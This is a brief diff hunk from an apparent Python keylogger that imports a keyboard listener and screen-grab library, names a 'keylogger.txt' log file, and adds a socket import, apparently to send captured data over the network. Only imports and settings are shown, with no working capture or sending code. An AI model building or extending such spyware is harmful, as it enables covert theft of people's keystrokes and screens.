@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
+import socket
 
 filepath = 'choose/path/to/your/file'
 keylog = 'keylogger.txt'
